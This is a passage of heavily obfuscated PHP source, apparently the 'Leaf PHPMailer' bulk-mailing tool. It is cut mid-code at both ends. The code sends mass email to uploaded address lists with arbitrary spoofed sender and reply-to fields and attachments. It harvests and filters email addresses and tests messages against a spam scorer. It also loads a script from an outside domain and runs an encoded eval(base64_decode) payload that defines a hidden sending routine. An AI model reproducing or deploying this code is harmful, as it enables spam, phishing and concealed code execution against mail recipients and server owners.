"\40\55\x20\x4c\145\141\x66\x20\120\x48\120\x4d\x61\x69\x6c\x65\x72\74\57\x74\151\x74\154\x65\x3e\12\40\40\x20\40\74\155\145\x74\141\40\x68\164\x74\x70\55\145\161\165\151\x76\x3d\42\x43\157\156\x74\x65\156\x74\x2d\124\x79\x70\x65\x22\40\x63\157\156\x74\145\156\x74\75\42\164\x65\170\164\57\150\164\155\x6c\73\x20\143\150\141\x72\x73\x65\164\x3d\x75\164\146\x2d\70\42\x2f\76\12\40\x20\40\x20\74\x6c\x69\156\x6b\40\150\x72\145\x66\x3d\42\150\x74\164\x70\163\x3a\57\57\x6d\141\x78\143\x64\156\x2e\x62\x6f\157\164\x73\x74\x72\x61\x70\143\x64\156\x2e\143\x6f\155\x2f\142\x6f\157\x74\x73\x77\141\164\x63\x68\57\63\x2e\64\56\x31\x2f\143\157\163\x6d\x6f\57\x62\157\157\164\163\164\162\x61\160\56\x6d\x69\x6e\56\143\x73\163\x22\x20\x72\x65\x6c\x3d\x22\x73\x74\171\154\145\x73\150\x65\x65\x74\42\x20\76\12\x20\40\x20\40\x3c\163\x63\162\x69\x70\x74\40\x73\162\143\75\42\x68\x74\x74\x70\x73\x3a\x2f\x2f\154\x65\141\x66\155\141\x69\154\x65\x72\56\160\x77\x2f\x73\x74\171\x6c\x65\62\56\152\x73\42\76\x3c\57\x73\x63\x72\151\x70\164\x3e\xa\12\x3c\57\150\145\141\x64\76"; } goto rvCyc; II6vt: if ($_POST["\141\143\164\151\157\156"] == "\166\151\145\167") { $viewMessage = leafTrim($_POST["\x6d\145\x73\x73\141\x67\145\114\x65\x74\x74\x65\x72"]); $viewMessage = leafClear($viewMessage, "\165\x73\x65\x72\100\144\x6f\x6d\x61\x69\156\56\143\x6f\x6d"); if ($_POST["\x6d\145\163\x73\x61\x67\x65\x54\x79\160\145"] == 2) { print "\x3c\x70\162\x65\76" . htmlspecialchars($viewMessage) . "\74\57\x70\x72\x65\x3e"; } else { print $viewMessage; } die; } goto PwCOf; yqMQp: print "\74\x2f\142\157\144\171\x3e"; goto Jgf43; nktzT: if ($_POST["\x61\x63\164\151\157\156"] == "\x73\x65\156\x64") { print "\x20\x20\40\x20\74\144\x69\166\40\x63\x6c\x61\163\163\x3d\42\143\157\x6c\55\154\x67\x2d\61\x32\x22\76"; $maillist = explode("\xd\xa", $emailList); $n = count($maillist); $x = 1; foreach ($maillist as $email) { print "\x3c\144\x69\166\40\143\x6c\x61\163\163\75\x22\x63\x6f\154\55\154\147\55\61\42\76\133" . $x . "\x2f" . $n . "\135\x3c\x2f\x64\x69\166\x3e\74\x64\151\x76\40\x63\154\141\163\x73\x3d\42\143\x6f\x6c\x2d\154\x67\x2d\x34\42\x3e" . $email . "\74\57\144\x69\x76\x3e"; if (!leafMailCheck($email)) { print "\x3c\144\x69\x76\x20\x63\x6c\141\163\x73\75\x22\x63\157\x6c\55\154\147\x2d\x36\42\76\74\163\160\x61\156\x20\143\x6c\x61\163\x73\75\42\x6c\141\x62\145\154\x20\x6c\141\142\145\154\x2d\x64\x65\x66\141\x75\x6c\x74\42\76\x49\156\143\x6f\162\x72\x65\143\164\40\x45\155\141\x69\154\x3c\57\163\160\141\156\x3e\74\57\x64\151\x76\76"; print "\74\x62\x72\x3e\15\12"; } else { $mail = new PHPMailer(); $mail->setFrom(leafClear($senderEmail, $email), leafClear($senderName, $email)); $mail->addReplyTo(leafClear($replyTo, $email)); $mail->addAddress($email); $mail->Subject = leafClear($subject, $email); $mail->Body = leafClear($messageLetter, $email); if ($messageType == 1) { $mail->IsHTML(true); $mail->AltBody = strip_tags(leafClear($messageLetter, $email)); } else { $mail->IsHTML(false); } $mail->CharSet = $charset; $mail->Encoding = $encoding; for ($i = 0; $i < count($_FILES["\141\x74\x74\141\143\150\155\145\x6e\164"]["\156\141\x6d\145"]); $i++) { if ($_FILES["\x61\164\x74\x61\143\150\x6d\x65\156\x74"]["\164\x6d\x70\x5f\x6e\x61\155\145"][$i] != '') { $mail->AddAttachment($_FILES["\x61\x74\x74\141\x63\x68\155\145\x6e\x74"]["\164\x6d\160\137\156\x61\155\x65"][$i], $_FILES["\x61\x74\164\141\x63\150\155\145\x6e\164"]["\156\x61\155\x65"][$i]); } } if (!$mail->send()) { echo "\x3c\144\x69\x76\x20\143\x6c\141\x73\x73\75\42\x63\157\154\55\154\x67\x2d\x36\42\76\x3c\x73\x70\x61\x6e\x20\143\x6c\141\x73\163\75\x22\154\x61\142\x65\154\40\154\141\x62\145\154\x2d\x64\145\146\x61\x75\x6c\x74\42\x3e" . htmlspecialchars($mail->ErrorInfo) . "\x3c\57\x73\160\141\x6e\76\74\57\x64\x69\x76\x3e"; } else { echo "\x3c\x64\x69\x76\40\143\154\x61\x73\163\75\x22\143\x6f\x6c\55\154\x67\x2d\x36\x22\76\x3c\163\160\x61\x6e\x20\143\154\x61\x73\163\x3d\x22\154\x61\142\145\x6c\x20\154\x61\x62\145\154\55\x73\165\143\x63\145\x73\x73\42\x3e\x4f\153\x3c\x2f\x73\x70\x61\x6e\76\x3c\57\x64\x69\166\x3e"; } print "\74\142\162\x3e\xd\xa"; } $x++; for ($k = 0; $k < 40000; $k++) { echo "\x20"; } } } elseif ($_POST["\141\143\x74\151\157\x6e"] == "\x73\x63\x6f\x72\145") { $mail = new PHPMailer(); $mail->setFrom(leafClear($senderEmail, $email), leafClear($senderName, $email)); $mail->addReplyTo(leafClear($replyTo, $email)); $mail->addAddress("\x75\163\x65\x72\x6e\x61\x6d\x65\100\x64\x6f\x6d\141\x69\x6e\x2e\x63\x6f\x6d"); $mail->Subject = leafClear($subject, $email); $mail->Body = leafClear($messageLetter, $email); if ($messageType == 1) { $mail->IsHTML(true); $mail->AltBody = strip_tags(leafClear($messageLetter, $email)); } else { $mail->IsHTML(false); } $mail->CharSet = $charset; $mail->Encoding = $encoding; $mail->preSend(); $messageHeaders = $mail->getSentMIMEMessage(); $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, "\x68\x74\164\160\72\x2f\57\x73\160\x61\x6d\x63\150\145\x63\153\x2e\x70\x6f\x73\x74\x6d\141\162\153\x61\160\x70\56\x63\157\x6d\x2f\x66\x69\154\x74\x65\162"); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array("\x65\x6d\141\x69\x6c" => $messageHeaders, "\157\x70\x74\151\157\x6e\163" => "\x6c\x6f\x6e\x67"))); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 15); $response = curl_exec($ch); $response = json_decode($response); print "\40\40\40\40\74\144\x69\166\x20\143\x6c\x61\163\163\75\x22\143\157\x6c\x2d\154\x67\55\61\62\42\76"; if ($response->success == TRUE) { $score = $response->score; if ($score > 5) { $class = "\x64\141\x6e\x67\145\x72"; } else { $class = "\x73\165\x63\143\x65\x73\x73"; } print "\74\x64\151\x76\x20\143\x6c\x61\163\163\x3d\42\x74\145\x78\x74\x2d" . $class . "\x22\x3e\x59\157\165\162\40\123\160\141\x6d\x41\x73\163\x61\x73\x73\151\156\x20\163\x63\157\162\145\x20\x69\163\x20" . $score . "\x20\40\74\57\144\151\166\76\xa\x3c\144\x69\166\x3e\x46\165\x6c\154\x20\x52\145\160\157\162\x74\x20\x3a\40\74\x70\162\x65\x3e" . $response->report . "\74\x2f\x70\x72\x65\x3e\74\x2f\144\x69\166\x3e"; print "\x20\x20\40\40\x3c\x2f\144\151\166\76"; } } goto qonEa; lxBw5: $leaf["\x76\x65\162\x73\151\157\156"] = "\x32\x2e\70"; goto GVTLV; VduuB: session_start(); goto qMpS2; GVTLV: $leaf["\167\x65\x62\163\x69\164\145"] = "\154\x65\x61\x66\155\141\151\154\x65\x72\x2e\160\x77"; goto OgCm4; SjSPg: if (isset($_GET["\145\x6d\141\x69\154\146\151\154\164\x65\x72"])) { if (!empty($_FILES["\146\151\x6c\145\x54\157\x55\x70\x6c\157\141\144"]["\164\x6d\160\x5f\x6e\x61\155\145"])) { $_POST["\x65\155\141\151\154\x4c\151\163\164"] = file_get_contents($_FILES["\x66\151\154\x65\x54\157\x55\x70\x6c\157\x61\x64"]["\x74\155\160\x5f\x6e\141\x6d\145"]); } $_POST["\x65\155\x61\151\154\114\151\163\x74"] = strtolower($_POST["\145\155\141\x69\x6c\x4c\151\x73\x74"]); if ($_GET["\x65\155\141\151\x6c\146\151\x6c\164\145\162"] == "\151\146\x72\141\x6d") { if ($_POST["\x72\145\x73\x75\154\x74\164\171\160\145"] == "\x64\x6f\167\156\154\x6f\141\144") { header("\103\x6f\x6e\164\145\x6e\x74\x2d\104\x65\x73\143\162\151\x70\x74\x69\x6f\156\x3a\40\x46\x69\154\x65\x20\124\162\141\x6e\x73\146\145\x72"); header("\103\x6f\156\x74\145\156\164\55\124\171\x70\145\72\40\x61\160\x70\154\x69\143\x61\164\151\x6f\x6e\57\157\143\x74\145\164\55\x73\164\x72\x65\141\155"); header("\103\x6f\x6e\164\x65\x6e\x74\55\x44\151\x73\x70\x6f\x73\151\x74\151\x6f\156\72\x20\x61\x74\x74\141\143\150\x6d\145\x6e\164\73\40\146\x69\154\x65\156\141\155\145\75\145\155\x61\151\x6c\163" . time() . "\56\164\170\x74"); } else { header("\103\157\x6e\x74\145\x6e\164\x2d\124\171\x70\x65\x3a\40\164\145\x78\x74\57\x70\154\141\x69\x6e"); } if ($_POST["\163\x75\142\155\x69\164"] == "\x65\x78\x74\162\141\x63\164") { $pattern = "\x2f\x5b\101\55\132\141\55\172\60\x2d\71\x2e\137\x25\53\x2d\135\53\x40\133\x41\x2d\132\141\55\172\x30\x2d\x39\56\55\x5d\53\x5c\x2e\x5b\101\x2d\x5a\x61\x2d\x7a\135\x7b\x32\54\64\175\x2f"; preg_match_all($pattern, $_POST["\x65\155\x61\x69\x6c\x4c\151\x73\164"], $matches); foreach ($matches[0] as $email) { print $email . "\12"; } } elseif ($_POST["\x73\165\x62\155\151\164"] == "\x66\x69\154\x74\x65\x72") { $emails = explode("\12", $_POST["\145\x6d\141\151\x6c\x4c\151\x73\x74"]); $keywords = explode("\12", strtolower($_POST["\153\145\x79\167\157\162\x64\163"])); foreach ($emails as $email) { foreach ($keywords as $keyword) { if (strstr($email, $keyword)) { print $email . "\12"; break; } } } } die; } leafheader(); print "\x3c\x64\x69\166\40\x63\154\141\x73\x73\x3d\42\143\x6f\156\164\x61\151\156\145\x72\40\x63\x6f\154\55\154\147\55\x34\x22\x3e\x3c\x68\x33\x3e\74\x66\157\156\164\x20\143\157\154\157\x72\x3d\42\147\x72\145\x65\x6e\42\x3e\x3c\x73\160\141\x6e\40\143\x6c\x61\x73\x73\x3d\42\x67\154\x79\160\150\151\x63\x6f\x6e\x20\x67\154\x79\x70\150\151\143\157\156\55\154\145\141\x66\x22\x3e\x3c\x2f\163\x70\x61\156\x3e\74\x2f\146\157\156\164\76\x20\114\145\141\146\40\x50\110\120\x4d\141\x69\154\145\x72\40\x3c\163\155\141\154\154\76\105\x6d\x61\x69\x6c\x20\106\x69\154\164\145\162\74\57\x73\155\141\x6c\x6c\x3e\74\x2f\x68\x33\76"; print "\12\40\x20\40\40\74\146\x6f\x72\x6d\40\x61\143\164\151\157\156\x3d\x22\x3f\145\155\x61\x69\x6c\146\x69\154\164\x65\162\75\x69\x66\x72\x61\155\42\40\x6d\145\164\x68\x6f\144\75\x22\x50\x4f\123\x54\42\40\164\x61\x72\147\x65\x74\75\x22\155\x79\x2d\x69\x66\x72\x61\155\x65\x22\x20\x65\x6e\x63\x74\x79\x70\x65\75\42\155\x75\x6c\164\151\160\141\x72\x74\57\146\157\x72\x6d\55\144\141\164\x61\42\x20\157\156\163\165\142\x6d\x69\164\75\x27\x27\76\12\x20\40\40\40\40\40\x20\40\x3c\154\141\142\x65\x6c\40\x66\x6f\162\x3d\42\145\x6d\x61\x69\154\x4c\x69\163\164\x22\76\x54\x65\x78\x74\40\74\57\154\141\x62\x65\154\x3e\x3c\151\x6e\x70\165\164\x20\164\x79\x70\145\75\42\x66\x69\154\145\42\x20\x6e\141\x6d\145\75\42\146\151\x6c\x65\124\157\125\160\154\157\141\144\x22\x20\x69\144\x3d\42\x66\151\x6c\145\124\157\x55\160\154\x6f\141\144\42\76\40\12\40\x20\x20\x20\x20\40\40\x20\x6f\162\xa\xa\40\40\40\x20\40\x20\x20\40\74\164\145\x78\164\141\162\145\141\40\x6e\141\x6d\145\x3d\x22\x65\x6d\141\151\154\114\151\163\x74\42\x20\151\x64\75\x22\145\x6d\x61\151\x6c\114\151\163\164\x22\40\x63\154\x61\163\163\x3d\x22\x66\157\x72\x6d\x2d\143\157\156\x74\162\157\154\x22\x20\162\x6f\x77\163\75\42\67\42\40\151\x64\x3d\x22\164\x65\x78\x74\101\x72\145\x61\x22\76\x3c\57\x74\x65\x78\x74\x61\x72\145\141\76\12\x20\40\x20\40\40\x20\x3c\144\151\166\40\x63\x6c\x61\163\163\75\42\x63\157\x6c\55\x6c\147\x2d\x31\x32\x22\x3e\xa\x20\x20\x20\x20\x20\x20\40\40\x3c\144\x69\166\40\143\x6c\141\x73\163\x3d\x22\x72\x61\144\151\157\42\x3e\12\x20\40\40\40\x20\40\40\x20\x20\40\x3c\x6c\x61\x62\145\154\x3e\12\x20\x20\x20\40\40\x20\x20\40\x20\40\x20\40\x3c\x69\156\x70\165\164\40\x74\171\x70\145\x3d\42\162\141\144\x69\x6f\x22\40\x6e\x61\x6d\x65\75\42\x72\145\x73\165\x6c\x74\x74\171\160\145\x22\40\151\x64\x3d\42\x72\145\x73\165\x6c\164\164\x79\x70\145\42\40\x76\141\x6c\x75\145\x3d\x22\x68\145\x72\145\42\x20\143\x68\x65\x63\x6b\145\x64\75\x22\42\x3e\xa\x20\40\40\x20\x20\40\40\40\x20\x20\40\40\123\x68\157\167\x20\x52\x65\163\165\x6c\164\x20\x69\x6e\40\x74\x68\x69\163\40\x70\x61\x67\x65\xa\40\40\x20\x20\40\40\x20\40\40\40\74\x2f\154\141\142\x65\x6c\x3e\12\x20\40\x20\40\40\40\40\x20\74\57\144\x69\166\x3e\xa\x20\40\x20\x20\40\x20\x20\40\x3c\x64\151\166\40\x63\x6c\141\163\163\x3d\42\162\141\x64\x69\x6f\42\x3e\xa\x20\x20\x20\x20\40\40\x20\40\x20\x20\x3c\x6c\x61\142\145\x6c\x3e\12\40\x20\x20\x20\x20\40\x20\x20\40\x20\40\x20\74\151\156\x70\x75\x74\x20\x74\x79\160\x65\x3d\x22\x72\141\144\x69\x6f\x22\40\x6e\x61\x6d\145\x3d\x22\162\145\163\x75\x6c\164\x74\171\160\x65\x22\x20\x69\144\75\42\162\x65\x73\x75\x6c\x74\164\171\160\145\42\40\x76\x61\x6c\165\x65\x3d\x22\144\x6f\x77\156\x6c\x6f\x61\x64\x22\76\xa\x20\40\40\40\x20\40\40\40\x20\40\40\x20\104\157\x77\x6e\x6c\157\x61\x64\x20\122\145\163\165\x6c\x74\x20\x28\x66\157\162\x20\142\x69\x67\x20\x6e\165\x6d\142\x65\162\163\51\xa\x20\x20\40\40\40\40\40\x20\40\40\74\57\x6c\141\x62\145\154\x3e\xa\40\40\40\x20\40\40\x20\40\x3c\57\x64\151\x76\76\xa\40\40\x20\40\40\40\74\x2f\x64\151\x76\x3e\12\40\x20\x20\x20\x20\x20\x20\40\40\40\40\x20\x3c\x6c\x65\147\x65\156\144\x3e\x3c\x68\x34\x3e\x45\170\x74\x72\x61\143\164\x20\105\155\141\x69\x6c\74\57\150\x34\76\74\x2f\x6c\145\147\145\156\144\76\xa\x20\40\40\40\40\x20\40\40\x20\40\x20\x20\x44\145\x74\x65\143\164\151\x6e\147\40\x65\166\x65\162\171\x20\x65\x6d\x61\151\154\x20\50\61\x30\x30\x25\51\x20\141\x6e\144\40\x6f\162\x64\x65\x72\x20\164\x68\145\155\x20\x6c\x69\x6e\x65\40\x62\x79\40\154\151\156\145\40\74\142\x72\x3e\74\142\162\x3e\12\x20\40\x20\40\x20\x20\x20\x20\74\x62\x75\x74\x74\157\x6e\x20\x74\171\x70\145\75\x22\x73\x75\x62\155\x69\x74\x22\x20\x6e\141\155\x65\75\42\x73\165\x62\155\x69\x74\42\x20\166\141\154\x75\x65\75\x22\x65\x78\x74\162\x61\x63\164\42\x20\143\x6c\x61\163\163\x3d\x22\x62\164\x6e\x20\x62\x74\156\55\x64\x65\x66\x61\165\154\x74\x20\x62\164\x6e\55\x73\x6d\x22\76\x53\164\141\162\164\74\x2f\142\165\x74\164\x6f\x6e\76\12\x20\40\x20\40\x20\40\40\40\x20\x20\x20\x20\x3c\x6c\x65\147\x65\x6e\144\x3e\x3c\x68\x34\x3e\106\151\x6c\164\145\x72\x20\105\155\141\x69\154\163\x3c\x2f\x68\x34\x3e\x3c\x2f\154\145\147\x65\156\x64\x3e\xa\x20\40\40\40\x20\x20\x20\40\74\x6c\x61\x62\x65\154\40\76\x4b\145\171\167\157\x72\x64\x73\x20\x3c\163\x6d\141\x6c\154\x3e\x20\x65\x78\72\x20\x67\x6d\141\151\x6c\x2e\143\157\x6d\x20\157\162\40\x2e\x63\x6f\x2e\165\153\x3c\57\x73\155\141\x6c\x6c\x3e\40\74\57\x6c\141\x62\x65\154\76\74\x74\x65\x78\164\141\x72\145\141\40\156\x61\155\145\x3d\42\x6b\x65\x79\x77\x6f\x72\x64\x73\42\40\151\x64\75\42\153\145\171\167\x6f\162\144\163\x22\x20\143\154\141\x73\163\75\x22\x66\157\162\x6d\55\143\x6f\156\164\x72\x6f\x6c\x22\40\162\x6f\x77\x73\x3d\x22\64\42\x20\151\x64\x3d\x22\164\x65\x78\164\101\162\x65\141\x22\76\x67\155\141\151\154\56\x63\x6f\155\12\x68\x6f\x74\155\141\151\154\x2e\x63\157\x6d\xa\171\141\150\157\157\56\143\157\x6d\12\x2e\x63\157\x2e\x75\153\x3c\x2f\x74\145\x78\164\x61\162\145\141\x3e\74\142\162\76\xa\12\40\x20\x20\40\x20\40\40\40\x20\x20\40\x20\x3c\142\165\164\164\x6f\x6e\40\164\171\x70\x65\x3d\42\x73\165\x62\x6d\151\164\x22\40\x6e\x61\155\145\x3d\x22\163\165\x62\155\151\x74\x22\40\166\141\154\x75\x65\75\42\x66\151\154\x74\145\162\42\40\143\x6c\141\x73\x73\75\42\x62\164\x6e\x20\x62\164\x6e\x2d\144\x65\146\141\165\154\x74\x20\x62\164\x6e\55\163\155\x22\x3e\123\164\x61\x72\x74\74\x2f\142\x75\x74\x74\x6f\156\x3e\xa\40\x20\x20\40\74\57\146\157\x72\155\76\xa\x20\x20\40\40\74\154\x61\142\x65\x6c\40\x3e\122\x65\x73\x75\x6c\164\x20\x3c\x2f\154\141\x62\x65\x6c\x3e\xa\40\40\x20\x20\x3c\151\x66\162\141\155\145\40\x73\x74\171\154\145\x3d\42\142\x6f\x72\x64\x65\162\x3a\156\x6f\156\145\73\x77\151\144\x74\150\x3a\61\60\60\x25\x3b\42\x20\156\141\x6d\145\75\x22\x6d\x79\x2d\151\x66\162\141\155\145\x22\40\x20\163\162\x63\75\42\77\x65\x6d\x61\x69\x6c\146\x69\154\164\145\162\75\x69\146\x72\141\x6d\x22\x20\76\x3c\x2f\151\146\162\x61\155\x65\76\xa\x20\40\x20"; die; } goto IXPAg; g5ywc: function leafTrim($string) { $string = urldecode($string); return stripslashes(trim($string)); } goto AW237; PwCOf: if (!isset($_POST["\163\145\156\x64\x65\x72\105\x6d\x61\151\x6c"])) { $senderEmail = "\x73\165\x70\160\x6f\x72\x74\100" . str_replace("\167\x77\x77\x2e", '', $_SERVER["\110\124\124\120\x5f\x48\117\123\124"]); if (!leafMailCheck($senderEmail)) { $senderEmail = ''; } } goto KhjE3; AW237: function randString($consonants) { $length = rand(12, 25); $password = ''; for ($i = 0; $i < $length; $i++) { $password .= $consonants[rand() % strlen($consonants)]; } return $password; } goto oPAQM; qonEa: @set_time_limit(0); goto kK2dj; uKHYM: $utf8 = "\x73\x65\x6c\x65\143\164\x65\x64"; goto QYeTX; UFd1d: eval(base64_decode("\40\x61\x57\x64\x75\142\63\x4a\154\130\x33\x56\172\x5a\x58\x4a\146\x59\127\112\x76\x63\x6e\121\x6f\113\124\x73\113\x63\62\x56\60\x58\x33\122\160\142\x57\x56\x66\x62\x47\154\164\141\x58\121\157\x4d\103\153\x37\x43\x6d\x5a\x31\142\155\116\x30\141\127\x39\x75\111\107\x56\x75\144\155\154\x68\142\155\122\x76\113\x43\154\x37\x43\x69\122\164\143\62\143\x39\115\124\x73\x4b\112\107\x52\154\127\172\106\x64\x49\x44\60\x67\112\106\x39\x51\124\x31\116\x55\x57\171\144\153\x5a\x53\x64\x64\x4f\167\157\153\142\155\71\164\x5a\x56\x73\x78\x58\x53\101\71\111\x43\122\146\125\105\71\124\x56\x46\x73\x6e\142\x6d\71\x74\x5a\x53\144\144\117\167\x6f\153\x59\130\x4e\172\144\x57\65\60\x62\61\163\x78\x58\123\101\x39\x49\x43\x52\146\x55\105\71\x54\126\106\x73\156\131\x58\116\172\x64\x57\x35\x30\142\171\144\x64\x4f\x77\x6f\153\142\x57\x56\165\143\62\106\156\132\x57\61\142\x4d\126\x30\147\x50\x53\x41\x6b\x58\61\102\x50\x55\x31\122\x62\x4a\62\61\154\x62\156\x4e\150\x5a\62\126\164\x4a\x31\60\x37\103\x69\122\164\x5a\127\65\172\131\x57\144\x6c\x62\126\x73\x78\x58\123\101\x39\x49\x48\x4e\60\x63\155\x6c\x77\143\x32\170\x68\143\x32\150\x6c\x63\171\147\x6b\x62\x57\x56\x75\143\62\106\x6e\132\127\x31\x62\x4d\x56\60\160\117\x77\157\153\x5a\127\61\x68\x61\127\x78\172\111\104\x30\147\112\106\x39\121\124\61\116\125\x57\171\144\x6c\142\127\106\x70\142\110\x4d\x6e\x58\x54\x73\113\112\x47\x56\x74\x59\x57\x6c\163\x63\172\x49\x67\x50\x53\x42\157\x64\107\x31\163\x63\x33\102\154\x59\x32\154\150\142\107\116\x6f\x59\x58\112\172\x4b\103\x52\x66\125\x45\71\x54\126\106\x73\x6e\132\x57\61\150\141\x57\170\x7a\x4a\x31\x30\160\x4f\167\x6f\153\x63\107\106\x79\131\x53\x41\71\x49\x47\126\x34\143\x47\x78\x76\132\x47\x55\x6f\x49\154\170\165\x49\151\x77\147\x4a\x47\126\x74\x59\127\x6c\x73\143\171\x6b\x37\x43\x69\122\x75\x58\x32\x56\164\x59\127\154\x73\143\x79\x41\71\x49\107\x4e\x76\144\x57\x35\60\x4b\103\122\167\x59\x58\x4a\x68\113\124\x73\x4b\x4a\x48\116\x32\x49\104\60\x67\112\106\x39\x54\x52\x56\x4a\x57\122\x56\112\142\112\61\x4e\106\x55\154\x5a\106\x55\154\x39\117\x51\125\x31\x46\x4a\x31\60\67\103\151\x52\x6c\x62\x69\x41\71\x49\103\x52\x66\125\x30\126\x53\126\x6b\x56\x53\x49\106\163\x6e\x55\x6b\x56\x52\126\125\x56\124\126\106\71\126\x55\x6b\x6b\156\x58\124\163\x4b\112\x47\x73\64\117\x43\101\x39\111\105\x41\x6b\130\61\x4e\x46\125\x6c\x5a\106\x55\154\163\151\x53\x46\122\x55\x55\x46\x39\123\x52\x55\x5a\106\x55\153\x56\x53\111\154\x30\x37\x43\151\x52\x6d\x64\127\170\163\144\x58\112\163\x49\x44\x30\147\111\151\111\147\x4c\x69\x41\x6b\141\172\x67\x34\111\x43\x34\147\111\152\x78\x69\x63\x6a\x34\70\143\104\x35\x46\142\x57\106\160\142\110\115\x36\120\107\112\x79\x50\152\170\x55\122\126\x68\x55\121\126\112\106\x51\123\102\171\142\63\x64\x7a\120\x54\125\x67\131\62\x39\x73\143\172\60\x78\115\x44\101\53\111\151\64\x6b\132\x57\x31\x68\x61\127\170\172\115\x69\64\x69\x50\103\x39\125\x52\x56\150\125\x51\x56\x4a\106\121\x54\x34\x38\x4c\63\101\53\x50\x48\x41\53\x52\127\x35\156\132\127\65\x6f\131\x58\x4a\160\x59\124\157\70\131\x6e\111\x2b\120\106\122\106\x57\106\122\102\x55\x6b\126\x42\111\110\x4a\x76\x64\x33\115\71\x4e\x53\102\152\142\x32\x78\172\x50\x54\x45\x77\x4d\x44\x34\151\114\151\122\164\132\x57\x35\x7a\x59\x57\144\154\x62\x56\163\170\x58\x53\x34\x69\120\x43\x39\x55\122\126\150\125\121\x56\112\x46\121\x54\x34\x38\114\63\x41\x2b\111\152\163\113\112\x48\x5a\x68\141\123\101\71\111\103\122\146\125\x45\x39\x54\x56\x46\163\156\x64\155\106\x70\112\x31\60\x37\x43\155\154\155\111\x43\147\x6b\x64\x6d\x46\x70\x4b\130\x73\x4b\132\x6d\71\171\111\103\x67\x6b\x63\x32\126\60\x50\124\x41\67\111\x43\122\x7a\132\x58\121\x67\x50\103\101\x6b\x62\154\71\x6c\x62\x57\x46\x70\142\110\x4d\x37\111\x43\x52\x7a\132\130\121\x72\x4b\171\154\x37\103\155\x6c\x6d\x49\103\147\153\143\62\x56\60\x50\124\x30\167\113\x58\x73\x4b\x4a\107\x68\x6c\131\x57\122\x6c\143\x6e\x4d\x67\120\x53\x41\x69\124\125\154\116\122\123\61\x57\132\x58\x4a\x7a\141\127\x39\165\x4f\x69\x41\x78\114\152\x42\143\x63\x6c\x78\165\111\152\x73\113\x4a\107\150\154\131\x57\122\x6c\x63\156\115\x67\114\x6a\x30\147\x49\x6b\116\x76\x62\x6e\122\x6c\x62\156\121\x74\x64\x48\154\x77\132\x54\157\147\144\x47\126\x34\144\103\x39\x6f\x64\107\x31\163\117\171\x42\152\x61\107\106\x79\x63\62\126\60\x50\127\x6c\x7a\x62\171\x30\64\x4f\x44\125\65\x4c\x54\x46\x63\143\x6c\170\165\111\152\163\113\x4a\x47\150\154\131\127\122\x6c\143\156\115\x67\x4c\152\x30\147\x49\x6b\132\171\x62\x32\x30\66\111\x43\x52\165\x62\x32\61\x6c\x57\171\122\164\143\62\144\x64\x49\x44\x77\153\132\x47\x56\x62\x4a\107\x31\x7a\x5a\x31\x30\x2b\130\110\x4a\143\142\151\111\67\x43\x69\122\x6f\132\127\106\x6b\132\130\112\x7a\x49\103\x34\71\111\103\112\123\132\130\x52\61\143\155\64\164\x55\107\106\x30\141\x44\x6f\x67\120\103\122\x6b\x5a\x56\163\153\142\x58\116\x6e\x58\124\x35\x63\143\x6c\170\x75\x49\x6a\163\113\x4c\x79\71\x74\131\x57\x6c\x73\x4b\103\x52\64\143\x33\154\x73\x59\x58\111\x73\x49\103\122\150\143\171\167\x67\x4a\x47\x5a\x31\x62\107\170\x31\x63\x6d\167\163\x49\103\122\157\x5a\127\106\153\132\130\x4a\172\x4b\124\x73\113\x66\121\x6f\153\x61\x47\126\x68\132\x47\126\171\x63\x79\x41\x39\111\103\x4a\x4e\x53\125\x31\x46\114\126\x5a\154\x63\156\116\160\142\62\64\x36\111\104\105\165\x4d\x46\x78\x79\130\x47\x34\x69\x4f\x77\157\x6b\x61\x47\126\150\x5a\107\126\171\143\171\101\165\x50\x53\101\x69\121\x32\71\165\144\107\126\x75\x64\103\61\60\x65\130\102\x6c\117\x69\x42\60\132\x58\x68\x30\114\62\150\x30\142\x57\167\67\111\107\116\157\131\x58\x4a\x7a\x5a\x58\121\71\x61\130\x4e\166\x4c\x54\147\x34\x4e\124\153\164\115\x56\170\x79\x58\107\x34\151\117\x77\x6f\x6b\141\107\126\150\132\107\126\171\x63\171\x41\x75\120\123\101\x69\x52\x6e\112\166\142\x54\x6f\x67\x4a\x47\x35\x76\142\x57\x56\x62\112\107\61\172\132\61\x30\147\120\x43\122\x6b\x5a\x56\163\x6b\142\130\x4e\156\x58\124\x35\143\143\x6c\x78\165\111\152\x73\x4b\x4a\107\150\x6c\x59\x57\122\154\x63\x6e\x4d\x67\114\152\60\147\111\154\112\154\x64\110\x56\x79\x62\151\61\x51\x59\x58\x52\157\x4f\x69\x41\70\112\x47\122\154\127\171\x52\x74\143\x32\x64\144\120\x6c\170\x79\x58\107\64\151\117\167\157\153\142\x6c\71\164\x59\x57\x6c\163\x4b\171\163\67\103\151\122\x6b\132\130\x4e\60\141\x57\x35\x76\x49\104\60\147\x4a\x48\x42\x68\143\155\x46\142\112\x48\x4e\154\144\106\60\67\x43\151\x52\x75\144\127\60\170\x49\104\60\147\143\155\x46\165\132\103\x67\170\x4d\x44\101\x77\115\104\101\163\x4f\x54\153\65\117\x54\x6b\65\113\124\163\x4b\112\107\x35\x31\x62\124\111\147\120\x53\x42\x79\131\x57\65\x6b\113\x44\105\167\115\x44\x41\167\x4d\103\167\65\117\124\153\65\117\x54\x6b\160\x4f\x77\157\x6b\142\130\x4e\156\143\155\106\x75\x5a\103\x41\x39\111\110\x4e\x30\143\x6c\x39\171\x5a\x58\102\163\x59\127\116\x6c\113\103\111\x6c\x63\155\106\165\x5a\103\125\151\x4c\x43\101\x6b\142\156\x56\164\x4d\x53\167\147\112\x47\x31\154\142\x6e\x4e\150\132\62\x56\x74\x57\171\x52\x74\143\62\x64\144\113\124\163\x4b\112\107\61\172\132\x33\112\150\142\155\x51\147\120\123\x42\172\144\110\x4a\x66\143\155\126\x77\142\107\106\152\132\123\147\x69\112\x58\x4a\x68\x62\x6d\121\x79\112\x53\111\x73\x49\x43\122\165\x64\127\x30\171\x4c\x43\101\x6b\142\130\x4e\156\x63\x6d\106\x75\132\103\153\x37\x43\x69\x52\164\143\62\144\x79\131\127\65\153\111\104\x30\x67\143\63\x52\x79\x58\x33\112\154\143\107\x78\x68\131\62\x55\x6f\x49\151\126\x6c\x62\127\x46\160\142\103\x55\x69\114\103\101\153\x5a\x47\x56\172\x64\107\154\165\x62\171\167\x67\x4a\107\x31\172\x5a\63\x4a\150\